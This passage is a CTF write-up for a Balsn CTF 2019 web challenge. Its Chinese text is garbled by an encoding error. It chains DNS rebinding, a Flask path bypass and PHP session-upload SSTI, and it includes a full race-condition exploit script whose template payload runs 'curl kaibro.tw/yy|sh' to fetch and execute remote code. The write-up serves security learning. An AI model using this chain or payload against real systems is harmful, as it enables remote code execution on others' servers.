class="line">  ),</span><br><span class="line">  <span class="comment">// An other file, not finished uploading, in the same request</span></span><br><span class="line">  <span class="number">1</span> =&gt; <span class="keyword">array</span>(</span><br><span class="line">   <span class="string">"field_name"</span> =&gt; <span class="string">"file2"</span>,</span><br><span class="line">   <span class="string">"name"</span> =&gt; <span class="string">"bar.avi"</span>,</span><br><span class="line">   <span class="string">"tmp_name"</span> =&gt; <span class="keyword">NULL</span>,</span><br><span class="line">   <span class="string">"error"</span> =&gt; <span class="number">0</span>,</span><br><span class="line">   <span class="string">"done"</span> =&gt; <span class="keyword">false</span>,</span><br><span class="line">   <span class="string">"start_time"</span> =&gt; <span class="number">1234567899</span>,</span><br><span class="line">   <span class="string">"bytes_processed"</span> =&gt; <span class="number">54554</span>,</span><br><span class="line">  ),</span><br><span class="line"> )</span><br><span class="line">);</span><br></pre></td></tr></table></figure>

<h5 id="step-1"><a href="#step-1" class="headerlink" title="step 1"></a>step 1</h5><h5 id="å¦‚æœä½ çœ‹åˆ°è¿™ä¸ªæºç index-phpï¼Œä½ å°†ä¼šçŸ¥é“è¿™ç¬¬ä¸€æ­¥æ˜¯å»ç»•è¿‡ipé™åˆ¶ã€‚"><a href="#å¦‚æœä½ çœ‹åˆ°è¿™ä¸ªæºç index-phpï¼Œä½ å°†ä¼šçŸ¥é“è¿™ç¬¬ä¸€æ­¥æ˜¯å»ç»•è¿‡ipé™åˆ¶ã€‚" class="headerlink" title="å¦‚æœä½ çœ‹åˆ°è¿™ä¸ªæºç index.phpï¼Œä½ å°†ä¼šçŸ¥é“è¿™ç¬¬ä¸€æ­¥æ˜¯å»ç»•è¿‡ipé™åˆ¶ã€‚"></a>å¦‚æœä½ çœ‹åˆ°è¿™ä¸ªæºç <code>index.php</code>ï¼Œä½ å°†ä¼šçŸ¥é“è¿™ç¬¬ä¸€æ­¥æ˜¯å»ç»•è¿‡<code>ip</code>é™åˆ¶ã€‚</h5><h5 id="äº‹å®ä¸Šï¼Œè¿™æ˜¯ä¸€ä¸ªæ˜æ˜¾çš„DNSé‡æ–°ç»‘å®šæ¼æ´ï¼Œå¯ä»¥ç»•è¿‡ipé™åˆ¶ã€‚"><a href="#äº‹å®ä¸Šï¼Œè¿™æ˜¯ä¸€ä¸ªæ˜æ˜¾çš„DNSé‡æ–°ç»‘å®šæ¼æ´ï¼Œå¯ä»¥ç»•è¿‡ipé™åˆ¶ã€‚" class="headerlink" title="äº‹å®ä¸Šï¼Œè¿™æ˜¯ä¸€ä¸ªæ˜æ˜¾çš„DNSé‡æ–°ç»‘å®šæ¼æ´ï¼Œå¯ä»¥ç»•è¿‡ipé™åˆ¶ã€‚"></a>äº‹å®ä¸Šï¼Œè¿™æ˜¯ä¸€ä¸ªæ˜æ˜¾çš„DNSé‡æ–°ç»‘å®šæ¼æ´ï¼Œå¯ä»¥ç»•è¿‡<code>ip</code>é™åˆ¶ã€‚</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">$ip = @dns_get_record($res[&apos;host&apos;], DNS_A)[0][&apos;ip&apos;];</span><br><span class="line">...</span><br><span class="line">$dev_ip = &quot;54.87.54.87&quot;;</span><br><span class="line">if($ip === $dev_ip) &#123;</span><br><span class="line">    $content = file_get_contents($dst);</span><br></pre></td></tr></table></figure>

<h5 id="è¿™ä¸ªfile-get-contents-ä¼šå†æ¬¡æŸ¥è¯¢DNSå’Œè¯»å–å“åº”ã€‚"><a href="#è¿™ä¸ªfile-get-contents-ä¼šå†æ¬¡æŸ¥è¯¢DNSå’Œè¯»å–å“åº”ã€‚" class="headerlink" title="è¿™ä¸ªfile_get_contents()ä¼šå†æ¬¡æŸ¥è¯¢DNSå’Œè¯»å–å“åº”ã€‚"></a>è¿™ä¸ª<code>file_get_contents()</code>ä¼šå†æ¬¡æŸ¥è¯¢DNSå’Œè¯»å–å“åº”ã€‚</h5><h5 id="å¦‚æœæˆ‘ä»¬å°†åŸŸçš„Aè®°å½•è®¾ç½®ä¸º54-87-54-87å’Œ127-0-0-1ï¼Œåˆ™å¯ä»¥ç»•è¿‡IPé™åˆ¶æŸ¥è¯¢å†…éƒ¨æœåŠ¡ã€‚"><a href="#å¦‚æœæˆ‘ä»¬å°†åŸŸçš„Aè®°å½•è®¾ç½®ä¸º54-87-54-87å’Œ127-0-0-1ï¼Œåˆ™å¯ä»¥ç»•è¿‡IPé™åˆ¶æŸ¥è¯¢å†…éƒ¨æœåŠ¡ã€‚" class="headerlink" title="å¦‚æœæˆ‘ä»¬å°†åŸŸçš„Aè®°å½•è®¾ç½®ä¸º54.87.54.87å’Œ127.0.0.1ï¼Œåˆ™å¯ä»¥ç»•è¿‡IPé™åˆ¶æŸ¥è¯¢å†…éƒ¨æœåŠ¡ã€‚"></a>å¦‚æœæˆ‘ä»¬å°†åŸŸçš„Aè®°å½•è®¾ç½®ä¸º<code>54.87.54.87</code>å’Œ<code>127.0.0.1</code>ï¼Œåˆ™å¯ä»¥ç»•è¿‡IPé™åˆ¶æŸ¥è¯¢å†…éƒ¨æœåŠ¡ã€‚</h5><h5 id="å¦‚æœæ²¡æœ‰ç„¶ååŸŸåå¯ä»¥ç”¨ä¸€äº›åœ¨çº¿çš„DNSé‡æ–°ç»‘å®šæœåŠ¡ï¼Œä¾‹å¦‚ï¼šrbndr-usã€‚"><a href="#å¦‚æœæ²¡æœ‰ç„¶ååŸŸåå¯ä»¥ç”¨ä¸€äº›åœ¨çº¿çš„DNSé‡æ–°ç»‘å®šæœåŠ¡ï¼Œä¾‹å¦‚ï¼šrbndr-usã€‚" class="headerlink" title="å¦‚æœæ²¡æœ‰ç„¶ååŸŸåå¯ä»¥ç”¨ä¸€äº›åœ¨çº¿çš„DNSé‡æ–°ç»‘å®šæœåŠ¡ï¼Œä¾‹å¦‚ï¼šrbndr.usã€‚"></a>å¦‚æœæ²¡æœ‰ç„¶ååŸŸåå¯ä»¥ç”¨ä¸€äº›åœ¨çº¿çš„DNSé‡æ–°ç»‘å®šæœåŠ¡ï¼Œä¾‹å¦‚ï¼š<code>rbndr.us</code>ã€‚</h5><h5 id="ä¾‹å¦‚36573657-7f000001-rbndr-uså°†è¿”å›54-87-54-87æˆ–127-0-0-1ã€‚"><a href="#ä¾‹å¦‚36573657-7f000001-rbndr-uså°†è¿”å›54-87-54-87æˆ–127-0-0-1ã€‚" class="headerlink" title="ä¾‹å¦‚36573657.7f000001.rbndr.uså°†è¿”å›54.87.54.87æˆ–127.0.0.1ã€‚"></a>ä¾‹å¦‚36573657.7f000001.rbndr.uså°†è¿”å›54.87.54.87æˆ–127.0.0.1ã€‚</h5><h5 id="step-2"><a href="#step-2" class="headerlink" title="step 2"></a>step 2</h5><h5 id="ä»dockerfileä¸­ï¼Œæˆ‘ä»¬çŸ¥é“åœ¨åŒä¸€å°æœåŠ¡å™¨ä¸Šè¿è¡Œç€ä¸€ä¸ªç®€å•çš„flaskåº”ç”¨ç¨‹åºã€‚"><a href="#ä»dockerfileä¸­ï¼Œæˆ‘ä»¬çŸ¥é“åœ¨åŒä¸€å°æœåŠ¡å™¨ä¸Šè¿è¡Œç€ä¸€ä¸ªç®€å•çš„flaskåº”ç”¨ç¨‹åºã€‚" class="headerlink" title="ä»dockerfileä¸­ï¼Œæˆ‘ä»¬çŸ¥é“åœ¨åŒä¸€å°æœåŠ¡å™¨ä¸Šè¿è¡Œç€ä¸€ä¸ªç®€å•çš„flaskåº”ç”¨ç¨‹åºã€‚"></a>ä»dockerfileä¸­ï¼Œæˆ‘ä»¬çŸ¥é“åœ¨åŒä¸€å°æœåŠ¡å™¨ä¸Šè¿è¡Œç€ä¸€ä¸ªç®€å•çš„flaskåº”ç”¨ç¨‹åºã€‚</h5><h5 id="å¹¶ä¸”åœ¨-error-pageåŠŸèƒ½ä¸Šå­˜åœ¨æ˜æ˜¾çš„SSTIæ¼æ´ï¼Œå®ƒrender-template-string-ä¸å¯æ§çš„å†…å®¹ä¸€èµ·ä½¿ç”¨ã€‚"><a href="#å¹¶ä¸”åœ¨-error-pageåŠŸèƒ½ä¸Šå­˜åœ¨æ˜æ˜¾çš„SSTIæ¼æ´ï¼Œå®ƒrender-template-string-ä¸å¯æ§çš„å†…å®¹ä¸€èµ·ä½¿ç”¨ã€‚" class="headerlink" title="å¹¶ä¸”åœ¨/error_pageåŠŸèƒ½ä¸Šå­˜åœ¨æ˜æ˜¾çš„SSTIæ¼æ´ï¼Œå®ƒrender_template_string()ä¸å¯æ§çš„å†…å®¹ä¸€èµ·ä½¿ç”¨ã€‚"></a>å¹¶ä¸”åœ¨<code>/error_page</code>åŠŸèƒ½ä¸Šå­˜åœ¨æ˜æ˜¾çš„SSTIæ¼æ´ï¼Œå®ƒ<code>render_template_string()</code>ä¸å¯æ§çš„å†…å®¹ä¸€èµ·ä½¿ç”¨ã€‚</h5><h5 id="å¦‚æœerror-statusè®¾ç½®ä¸ºç»å¯¹è·¯å¾„ï¼Œåˆ™è¿”å›è·¯å¾„os-path-join-å°†è¢«è¦†ç›–ã€‚"><a href="#å¦‚æœerror-statusè®¾ç½®ä¸ºç»å¯¹è·¯å¾„ï¼Œåˆ™è¿”å›è·¯å¾„os-path-join-å°†è¢«è¦†ç›–ã€‚" class="headerlink" title="å¦‚æœerror_statusè®¾ç½®ä¸ºç»å¯¹è·¯å¾„ï¼Œåˆ™è¿”å›è·¯å¾„os.path.join()å°†è¢«è¦†ç›–ã€‚"></a>å¦‚æœ<code>error_status</code>è®¾ç½®ä¸ºç»å¯¹è·¯å¾„ï¼Œåˆ™è¿”å›è·¯å¾„<code>os.path.join()</code>å°†è¢«è¦†ç›–ã€‚</h5><h5 id="ä¾‹å¦‚os-path-join-quot-var-www-flask-quot-quot-error-quot-quot-etc-passwd-quot-å°†è¿”å›-etc-passwdã€‚"><a href="#ä¾‹å¦‚os-path-join-quot-var-www-flask-quot-quot-error-quot-quot-etc-passwd-quot-å°†è¿”å›-etc-passwdã€‚" class="headerlink" title="ä¾‹å¦‚os.path.join(&quot;/var/www/flask&quot;, &quot;error&quot;, &quot;/etc/passwd&quot;)å°†è¿”å›/etc/passwdã€‚"></a>ä¾‹å¦‚<code>os.path.join(&quot;/var/www/flask&quot;, &quot;error&quot;, &quot;/etc/passwd&quot;)</code>å°†è¿”å›<code>/etc/passwd</code>ã€‚</h5><h5 id="ä½†æ˜¯è¿™é‡Œçš„é—®é¢˜æ˜¯ä½ ä¸èƒ½ç›´æ¥è§¦æ‘¸å®ƒ-error-pageã€‚"><a href="#ä½†æ˜¯è¿™é‡Œçš„é—®é¢˜æ˜¯ä½ ä¸èƒ½ç›´æ¥è§¦æ‘¸å®ƒ-error-pageã€‚" class="headerlink" title="ä½†æ˜¯è¿™é‡Œçš„é—®é¢˜æ˜¯ä½ ä¸èƒ½ç›´æ¥è§¦æ‘¸å®ƒ/error_pageã€‚"></a>ä½†æ˜¯è¿™é‡Œçš„é—®é¢˜æ˜¯ä½ ä¸èƒ½ç›´æ¥è§¦æ‘¸å®ƒ<code>/error_page</code>ã€‚</h5><h5 id="ç”±äºå‰é¢çš„phpå°†æ£€æŸ¥æŸ¥è¯¢çš„è·¯å¾„ï¼Œå› æ­¤è¯¥è·¯å¾„å¿…é¡»åŒ…å«å­—ç¬¦ä¸²korea"><a href="#ç”±äºå‰é¢çš„phpå°†æ£€æŸ¥æŸ¥è¯¢çš„è·¯å¾„ï¼Œå› æ­¤è¯¥è·¯å¾„å¿…é¡»åŒ…å«å­—ç¬¦ä¸²korea" class="headerlink" title="ç”±äºå‰é¢çš„phpå°†æ£€æŸ¥æŸ¥è¯¢çš„è·¯å¾„ï¼Œå› æ­¤è¯¥è·¯å¾„å¿…é¡»åŒ…å«å­—ç¬¦ä¸²korea:"></a>ç”±äºå‰é¢çš„phpå°†æ£€æŸ¥æŸ¥è¯¢çš„è·¯å¾„ï¼Œå› æ­¤è¯¥è·¯å¾„å¿…é¡»åŒ…å«å­—ç¬¦ä¸²<code>korea</code>:</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">if(stripos($res[&apos;path&apos;], &quot;korea&quot;) === FALSE) die(&quot;Error&quot;);</span><br></pre></td></tr></table></figure>

<h5 id="æœ‰ä¸¤ç§æ–¹æ³•å¯ä»¥ç»•è¿‡æ­¤è·¯å¾„çš„é™åˆ¶ï¼š"><a href="#æœ‰ä¸¤ç§æ–¹æ³•å¯ä»¥ç»•è¿‡æ­¤è·¯å¾„çš„é™åˆ¶ï¼š" class="headerlink" title="æœ‰ä¸¤ç§æ–¹æ³•å¯ä»¥ç»•è¿‡æ­¤è·¯å¾„çš„é™åˆ¶ï¼š"></a>æœ‰ä¸¤ç§æ–¹æ³•å¯ä»¥ç»•è¿‡æ­¤è·¯å¾„çš„é™åˆ¶ï¼š</h5><h5 id="æ–¹æ³•0x1"><a href="#æ–¹æ³•0x1" class="headerlink" title="æ–¹æ³•0x1"></a>æ–¹æ³•0x1</h5><h5 id="ä½ å¯ä»¥ä½¿ç”¨é‡å®šå‘ï¼š"><a href="#ä½ å¯ä»¥ä½¿ç”¨é‡å®šå‘ï¼š" class="headerlink" title="ä½ å¯ä»¥ä½¿ç”¨é‡å®šå‘ï¼š"></a>ä½ å¯ä»¥ä½¿ç”¨é‡å®šå‘ï¼š</h5><h5 id="ä½¿ç”¨DNSé‡æ–°ç»‘å®šåˆ°æœåŠ¡å™¨IPï¼Œç„¶åè®¾ç½®-koreaè¦é‡å®šå‘åˆ°çš„è·¯å¾„127-0-0-1-5000-error-page-err-ã€‚"><a href="#ä½¿ç”¨DNSé‡æ–°ç»‘å®šåˆ°æœåŠ¡å™¨IPï¼Œç„¶åè®¾ç½®-koreaè¦é‡å®šå‘åˆ°çš„è·¯å¾„127-0-0-1-5000-error-page-err-ã€‚" class="headerlink" title="ä½¿ç”¨DNSé‡æ–°ç»‘å®šåˆ°æœåŠ¡å™¨IPï¼Œç„¶åè®¾ç½®/koreaè¦é‡å®šå‘åˆ°çš„è·¯å¾„127.0.0.1:5000/error_page?=err......ã€‚"></a>ä½¿ç”¨DNSé‡æ–°ç»‘å®šåˆ°æœåŠ¡å™¨IPï¼Œç„¶åè®¾ç½®<code>/korea</code>è¦é‡å®šå‘åˆ°çš„è·¯å¾„<code>127.0.0.1:5000/error_page?=err......</code>ã€‚</h5><h5 id="åŸå› æ˜¯file-get-contents-å°†éµå¾ª302é‡å®šå‘ã€‚"><a href="#åŸå› æ˜¯file-get-contents-å°†éµå¾ª302é‡å®šå‘ã€‚" class="headerlink" title="åŸå› æ˜¯file_get_contents()å°†éµå¾ª302é‡å®šå‘ã€‚"></a>åŸå› æ˜¯<code>file_get_contents()</code>å°†éµå¾ª302é‡å®šå‘ã€‚</h5><h5 id="æ–¹æ³•0x2"><a href="#æ–¹æ³•0x2" class="headerlink" title="æ–¹æ³•0x2"></a>æ–¹æ³•0x2</h5><h5 id="ä½¿ç”¨Flaskçš„ç‰¹æ®ŠåŠŸèƒ½ï¼"><a href="#ä½¿ç”¨Flaskçš„ç‰¹æ®ŠåŠŸèƒ½ï¼" class="headerlink" title="ä½¿ç”¨Flaskçš„ç‰¹æ®ŠåŠŸèƒ½ï¼"></a>ä½¿ç”¨Flaskçš„ç‰¹æ®ŠåŠŸèƒ½ï¼</h5><h5 id="åœ¨flaskåº”ç”¨ç¨‹åºä¸­ï¼Œ-korea-pingç­‰äº-ping"><a href="#åœ¨flaskåº”ç”¨ç¨‹åºä¸­ï¼Œ-korea-pingç­‰äº-ping" class="headerlink" title="åœ¨flaskåº”ç”¨ç¨‹åºä¸­ï¼Œ//korea/pingç­‰äº/ping"></a>åœ¨flaskåº”ç”¨ç¨‹åºä¸­ï¼Œ<code>//korea/ping</code>ç­‰äº<code>/ping</code></h5><h5 id="å› æ­¤ï¼Œä½ å¯ä»¥ä½¿ç”¨-korea-error-page-err-ç»•è¿‡é™åˆ¶ã€‚"><a href="#å› æ­¤ï¼Œä½ å¯ä»¥ä½¿ç”¨-korea-error-page-err-ç»•è¿‡é™åˆ¶ã€‚" class="headerlink" title="å› æ­¤ï¼Œä½ å¯ä»¥ä½¿ç”¨//korea/error_page?err=...ç»•è¿‡é™åˆ¶ã€‚"></a>å› æ­¤ï¼Œä½ å¯ä»¥ä½¿ç”¨<code>//korea/error_page?err=...</code>ç»•è¿‡é™åˆ¶ã€‚</h5><h5 id="step-3"><a href="#step-3" class="headerlink" title="step 3"></a>step 3</h5><h5 id="ç°åœ¨ï¼Œæˆ‘ä»¬å¯ä»¥æ§åˆ¶render-template-string-è¯»å–å†…å®¹çš„è·¯å¾„ã€‚"><a href="#ç°åœ¨ï¼Œæˆ‘ä»¬å¯ä»¥æ§åˆ¶render-template-string-è¯»å–å†…å®¹çš„è·¯å¾„ã€‚" class="headerlink" title="ç°åœ¨ï¼Œæˆ‘ä»¬å¯ä»¥æ§åˆ¶render_template_string()è¯»å–å†…å®¹çš„è·¯å¾„ã€‚"></a>ç°åœ¨ï¼Œæˆ‘ä»¬å¯ä»¥æ§åˆ¶<code>render_template_string()</code>è¯»å–å†…å®¹çš„è·¯å¾„ã€‚</h5><h5 id="ä½ åº”è¯¥å¯ä»¥æ‰¾åˆ°ä¸€ä¸ªå¯ä»¥æ”¾ç½®æˆ‘ä»¬å¯æ§æœ‰æ•ˆè´Ÿè½½çš„æ–‡ä»¶ã€‚"><a href="#ä½ åº”è¯¥å¯ä»¥æ‰¾åˆ°ä¸€ä¸ªå¯ä»¥æ”¾ç½®æˆ‘ä»¬å¯æ§æœ‰æ•ˆè´Ÿè½½çš„æ–‡ä»¶ã€‚" class="headerlink" title="ä½ åº”è¯¥å¯ä»¥æ‰¾åˆ°ä¸€ä¸ªå¯ä»¥æ”¾ç½®æˆ‘ä»¬å¯æ§æœ‰æ•ˆè´Ÿè½½çš„æ–‡ä»¶ã€‚"></a>ä½ åº”è¯¥å¯ä»¥æ‰¾åˆ°ä¸€ä¸ªå¯ä»¥æ”¾ç½®æˆ‘ä»¬å¯æ§æœ‰æ•ˆè´Ÿè½½çš„æ–‡ä»¶ã€‚</h5><h5 id="ç”±äºæœåŠ¡å™¨ä½¿ç”¨phpè¿è¡Œï¼Œå› æ­¤å¯ä»¥ä½¿ç”¨è¯¥session-upload-progressæ–¹æ³•å°†SSTIæœ‰æ•ˆè´Ÿè½½ä¸Šä¼ åˆ°ä¼šè¯æ–‡ä»¶ã€‚"><a href="#ç”±äºæœåŠ¡å™¨ä½¿ç”¨phpè¿è¡Œï¼Œå› æ­¤å¯ä»¥ä½¿ç”¨è¯¥session-upload-progressæ–¹æ³•å°†SSTIæœ‰æ•ˆè´Ÿè½½ä¸Šä¼ åˆ°ä¼šè¯æ–‡ä»¶ã€‚" class="headerlink" title="ç”±äºæœåŠ¡å™¨ä½¿ç”¨phpè¿è¡Œï¼Œå› æ­¤å¯ä»¥ä½¿ç”¨è¯¥session.upload_progressæ–¹æ³•å°†SSTIæœ‰æ•ˆè´Ÿè½½ä¸Šä¼ åˆ°ä¼šè¯æ–‡ä»¶ã€‚"></a>ç”±äºæœåŠ¡å™¨ä½¿ç”¨phpè¿è¡Œï¼Œå› æ­¤å¯ä»¥ä½¿ç”¨è¯¥<code>session.upload_progress</code>æ–¹æ³•å°†SSTIæœ‰æ•ˆè´Ÿè½½ä¸Šä¼ åˆ°ä¼šè¯æ–‡ä»¶ã€‚</h5><h5 id="å¦‚æœPHP-SESSION-UPLOAD-PROGRESSåœ¨å¤šéƒ¨åˆ†POSTæ•°æ®ä¸­æä¾›ï¼ŒPHPå°†ä¸ºæ‚¨å¯ç”¨ä¼šè¯ã€‚"><a href="#å¦‚æœPHP-SESSION-UPLOAD-PROGRESSåœ¨å¤šéƒ¨åˆ†POSTæ•°æ®ä¸­æä¾›ï¼ŒPHPå°†ä¸ºæ‚¨å¯ç”¨ä¼šè¯ã€‚" class="headerlink" title="å¦‚æœPHP_SESSION_UPLOAD_PROGRESSåœ¨å¤šéƒ¨åˆ†POSTæ•°æ®ä¸­æä¾›ï¼ŒPHPå°†ä¸ºæ‚¨å¯ç”¨ä¼šè¯ã€‚"></a>å¦‚æœPHP_SESSION_UPLOAD_PROGRESSåœ¨å¤šéƒ¨åˆ†POSTæ•°æ®ä¸­æä¾›ï¼ŒPHPå°†ä¸ºæ‚¨å¯ç”¨ä¼šè¯ã€‚</h5><p>#####ï¼ˆæ¦‚å¿µä¸HITCON CTF 2018ç›¸åŒ-ä¸€è¡ŒphpæŒ‘æˆ˜ï¼š<a href="https://blog.orange.tw/2018/10/hitcon-ctf-2018-one-line-php-challenge.html" target="_blank" rel="noopener">é“¾æ¥</a>ï¼‰</p>
<p>#####ï¼ˆæ³¨æ„ï¼šæ‚¨çš„æœ‰æ•ˆè½½è·ä¸èƒ½åŒ…å«|ï¼Œå› ä¸ºè¿™ä¼šç ´åä¼šè¯å†…å®¹æ ¼å¼ã€‚ï¼‰</p>
<h5 id="step-4"><a href="#step-4" class="headerlink" title="step 4"></a>step 4</h5><h5 id="é»˜è®¤session-upload-progress-cleanupè®¾ç½®ä¸ºOnï¼Œå› æ­¤æ‚¨çš„SSTIæœ‰æ•ˆè´Ÿè½½å°†è¢«å¿«é€Ÿæ¸…é™¤ã€‚"><a href="#é»˜è®¤session-upload-progress-cleanupè®¾ç½®ä¸ºOnï¼Œå› æ­¤æ‚¨çš„SSTIæœ‰æ•ˆè´Ÿè½½å°†è¢«å¿«é€Ÿæ¸…é™¤ã€‚" class="headerlink" title="é»˜è®¤session.upload_progress.cleanupè®¾ç½®ä¸ºOnï¼Œå› æ­¤æ‚¨çš„SSTIæœ‰æ•ˆè´Ÿè½½å°†è¢«å¿«é€Ÿæ¸…é™¤ã€‚"></a>é»˜è®¤<code>session.upload_progress.cleanup</code>è®¾ç½®ä¸ºOnï¼Œå› æ­¤æ‚¨çš„SSTIæœ‰æ•ˆè´Ÿè½½å°†è¢«å¿«é€Ÿæ¸…é™¤ã€‚</h5><h5 id="æˆ‘ä»¬å¯ä»¥ç”¨æ¡ä»¶ç«äº‰ç»•è¿‡ã€‚"><a href="#æˆ‘ä»¬å¯ä»¥ç”¨æ¡ä»¶ç«äº‰ç»•è¿‡ã€‚" class="headerlink" title="æˆ‘ä»¬å¯ä»¥ç”¨æ¡ä»¶ç«äº‰ç»•è¿‡ã€‚"></a>æˆ‘ä»¬å¯ä»¥ç”¨æ¡ä»¶ç«äº‰ç»•è¿‡ã€‚</h5><h5 id="åˆ©ç”¨è„šæœ¬ï¼š"><a href="#åˆ©ç”¨è„šæœ¬ï¼š" class="headerlink" title="åˆ©ç”¨è„šæœ¬ï¼š"></a>åˆ©ç”¨è„šæœ¬ï¼š</h5><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">from</span> base64 <span class="keyword">import</span> b64encode</span><br><span class="line"><span class="keyword">from</span> random <span class="keyword">import</span> sample, randint</span><br><span class="line"><span class="keyword">from</span> multiprocessing.dummy <span class="keyword">import</span> Pool <span class="keyword">as</span> ThreadPool</span><br><span class="line"></span><br><span class="line">HOST = <span class="string">'http://koreanfish4.balsnctf.com/index.php'</span></span><br><span class="line">sess_name = <span class="string">'iamkaibro'</span></span><br><span class="line"></span><br><span class="line">headers = &#123;</span><br><span class="line">    <span class="string">'Connection'</span>: <span class="string">'close'</span>, </span><br><span class="line">    <span class="string">'Cookie'</span>: <span class="string">'PHPSESSID='</span> + sess_name</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">payload = <span class="string">"""</span></span><br><span class="line"><span class="string">&#123;% for c in []['__class__']['__base__']['__subclasses__']() %&#125;</span></span><br><span class="line"><span class="string">&#123;% if c['__name__'] == 'catch_warnings' %&#125;</span></span><br><span class="line"><span class="string">&#123;% for b in c['__init__']['__globals__']['values']() %&#125;</span></span><br><span class="line"><span class="string">&#123;% if b['__class__']==&#123;&#125;['__class__'] %&#125;</span></span><br><span class="line"><span class="string">&#123;% if 'eval' in b['keys']() %&#125;</span></span><br><span class="line"><span class="string">&#123;% if b['eval']('__import__("os")\\x2epopen("curl kaibro\\x2etw/yy\\x7csh")') %&#125;&#123;% endif %&#125;</span></span><br><span class="line"><span class="string">&#123;% endif %&#125;</span></span><br><span class="line"><span class="string">&#123;% endif %&#125;</span></span><br><span class="line"><span class="string">&#123;% endfor %&#125;</span></span><br><span class="line"><span class="string">&#123;% endif %&#125;</span></span><br><span class="line"><span class="string">&#123;% endfor %&#125;</span></span><br><span class="line"><span class="string">"""</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">runner1</span><span class="params">(i)</span>:</span></span><br><span class="line">    data = &#123;</span><br><span class="line">        <span class="string">'PHP_SESSION_UPLOAD_PROGRESS'</span>: payload</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">while</span> <span class="number">1</span>:</span><br><span class="line">        fp = open(<span class="string">'/etc/passwd'</span>, <span class="string">'rb'</span>)</span><br><span class="line">        r = requests.post(HOST, files=&#123;<span class="string">'f'</span>: fp&#125;, data=data, headers=headers)</span><br><span class="line">        fp.close()</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">runner2</span><span class="params">(i)</span>:</span></span><br><span class="line">    filename = <span class="string">'/var/lib/php/sessions/sess_'</span> + sess_name</span><br><span class="line">    <span class="comment"># print filename</span></span><br><span class="line">    <span class="keyword">while</span> <span class="number">1</span>:</span><br><span class="line">        url = <span class="string">'&#123;&#125;?%F0%9F%87%B0%F0%9F%87%B7%F0%9F%90%9F=http://36573657.7f000001.rbndr.us:5000//korea/error_page%3Ferr=&#123;&#125;'</span>.format(HOST, filename)</span><br><span class="line">        r = requests.get(url, headers=headers)</span><br><span class="line">        c = r.content</span><br><span class="line">        <span class="keyword">print</span> [c]</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> sys.argv[<span class="number">1</span>] == <span class="string">'1'</span>:</span><br><span class="line">    runner = runner1</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    runner = runner2</span><br><span class="line"></span><br><span class="line">pool = ThreadPool(<span class="number">32</span>)</span><br><span class="line">result = pool.map_async( runner, range(<span class="number">32</span>) ).get(<span class="number">0xffff</span>)</span><br></pre></td></tr></table></figure>

<h5 id="æœ€ågetshellæˆåŠŸã€‚"><a href="#æœ€ågetshellæˆåŠŸã€‚" class="headerlink" title="æœ€ågetshellæˆåŠŸã€‚"></a>æœ€ågetshellæˆåŠŸã€‚</h5><h4 id="0x02-Warmup"><a href="#0x02-Warmup" class="headerlink" title="0x02 Warmup"></a>0x02 Warmup</h4><h5 id="é¢˜ç›®æè¿°-1"><a href="#é¢˜ç›®æè¿°-1" class="headerlink" title="é¢˜ç›®æè¿°"></a>é¢˜ç›®æè¿°</h5><h5 id="Baby-PHP-challenge-again"><a href="#Baby-PHP-challenge-again" class="headerlink" title="Baby PHP challenge again."></a>Baby PHP challenge again.</h5><ul>
<li>Difficulty:éš¾</li>
<li>Type:Web</li>
<li>Solved:5/720</li>
<li>Tag:PHP,SSRF,MySQL,Windows<h5 id="æºç "><a href="#æºç " class="headerlink" title="æºç "></a><a href="https://github.com/w181496/My-CTF-Challenges/blob/master/Balsn-CTF-2019/Warmup/index.php" target="_blank" rel="noopener">æºç </a></h5><h5 id="è¿™ä¸ªé¢˜ç›®æ¶‰åŠåˆ°è®¸å¤šçš„phpåŸç†å’Œå¤è€çš„php-windowsæŠ€å·§ã€‚"><a href="#è¿™ä¸ªé¢˜ç›®æ¶‰åŠåˆ°è®¸å¤šçš„phpåŸç†å’Œå¤è€çš„php-windowsæŠ€å·§ã€‚" class="headerlink" title="è¿™ä¸ªé¢˜ç›®æ¶‰åŠåˆ°è®¸å¤šçš„phpåŸç†å’Œå¤è€çš„php/windowsæŠ€å·§ã€‚"></a>è¿™ä¸ªé¢˜ç›®æ¶‰åŠåˆ°è®¸å¤šçš„phpåŸç†å’Œå¤è€çš„php/windowsæŠ€å·§ã€‚</h5><h5 id="step-1-1"><a href="#step-1-1" class="headerlink" title="step 1"></a>step 1</h5><h5 id="åˆšå¼€å§‹æ‹¿åˆ°æºç 